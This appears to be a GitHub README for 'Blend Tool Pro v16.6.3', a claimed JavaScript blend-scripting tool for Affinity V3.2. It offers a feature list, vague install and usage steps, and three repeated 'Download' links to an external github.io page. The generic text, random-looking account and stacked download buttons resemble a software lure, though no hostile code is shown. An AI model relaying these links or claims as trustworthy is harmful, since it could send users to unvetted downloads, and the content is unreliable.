# Blend Tool Pro v16.6.3 - graphics scripting tool 2026

> **A JavaScript-based blend scripting tool for Affinity V3.2 that creates adjustable transitions between shapes, groups, and paths in version 16.6.3.**

[![Platform](https://img.shields.io/badge/Platform-Affinity%20V3.2-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v16.6.3-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/stoneloganytwd2914/blend-tool-pro-affinity-v32?style=flat-square)](https://github.com/stoneloganytwd2914/blend-tool-pro-affinity-v32)

---

<p align="center">
  <a href="https://stoneloganytwd2914.github.io/blend-tool-pro-affinity-v32/">
    <img src="https://img.shields.io/badge/Download-Blend%20Tool%20Pro%20Latest-brightgreen?style=for-the-badge" alt="Download Blend Tool Pro">
  </a>
</p>

> **[Direct Download - Blend Tool Pro v16.6.3](https://stoneloganytwd2914.github.io/blend-tool-pro-affinity-v32/)**

---

[Download Latest Build](https://stoneloganytwd2914.github.io/blend-tool-pro-affinity-v32/)

---

## Overview

Blend Tool Pro is a scripting utility for Affinity V3.2 workflows, designed around building blends between two shapes or groups. Its operation is driven by JavaScript, which makes it suitable for repeatable morphing setups, path-sensitive transitions, and tightly controlled interpolation across blend steps.

It is aimed at designers and technical artists who need more precision than a standard visual blend feature typically provides. The tool includes shape-to-shape blending, group interpolation, editable spine support, and live preview, so you can refine a blend without recreating the entire setup each time.

---

## Features

- Blend transitions between two shapes or groups
- Twist control across blend steps
- Multiple easing modes for transition shaping
- Per-endpoint scale adjustment
- Center bulge and pinch control
- Auto anchor point matching for paired objects
- Reverse path direction support
- Fill and stroke interpolation toggles
- Live non-destructive preview
- Blend on path with an editable spine
- Re-stepping for iterative refinement
- Group blending with glyph-by-glyph interpolation
- Stacking order control for layered output

---

## Installation

1. Download or clone the repository:
   `git clone https://github.com/stoneloganytwd2914/blend-tool-pro-affinity-v32.git
2. Open the project in your Affinity V3.2 environment or in the workflow that loads the script package.
3. Run or import the provided JavaScript tool according to your Affinity scripting setup.

If you are using the hosted build, start from the latest download link above and follow the included project files in the repository bundle.

---

## Usage

A common workflow looks like this:

1. Select the two shapes, groups, or paths you want to blend.
2. Configure the interpolation behavior you need, including easing, twist, or endpoint scaling.
3. Turn fill and stroke interpolation on or off based on the result you want.
4. Use live preview to evaluate the blend before committing changes.
5. Tweak the spine, stacking order, or path direction if the output needs more adjustment.
6. Re-step the blend whenever you want to rebuild the sequence with revised settings.

Example usage pattern:

- Create a blend between two vector objects.
- Switch to blend-on-path mode when the result needs a curved guide.
- Use group blending when working with multi-element compositions.
- Apply anchor matching to improve alignment between object pairs.

---

## Configuration

Most options are managed through the script controls and the active blend setup. If your workflow keeps presets or script settings separately, store them alongside the project files so they can be reused in later sessions.

Example configuration shape:

    {
      "easing": "smooth",
      "twist": true,
      "pathMode": true,
      "fillInterpolation": true,
      "strokeInterpolation": false
    }

---

## Requirements

- Affinity V3.2
- JavaScript support in the target workflow
- Vector shapes, groups, or paths to blend
- Enough local storage for the script files and any saved presets
- A desktop environment that can load the Affinity scripting tool

---

## FAQ

**Does it support path-based blending?**  
Yes, the feature set includes blend-on-path behavior with an editable spine.

**Can I update the blend after creating it?**  
Yes, the tool supports re-stepping and live preview for iterative changes.

**How are groups handled?**  
Group blending is supported, including glyph-by-glyph interpolation for structured content.

**Where are settings kept?**  
That depends on your workflow. In most cases, settings are stored in the script configuration or in your project assets.

**What if the result does not align as expected?**  
Check anchor matching, path direction, stacking order, and endpoint scaling, then preview again before finalizing.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
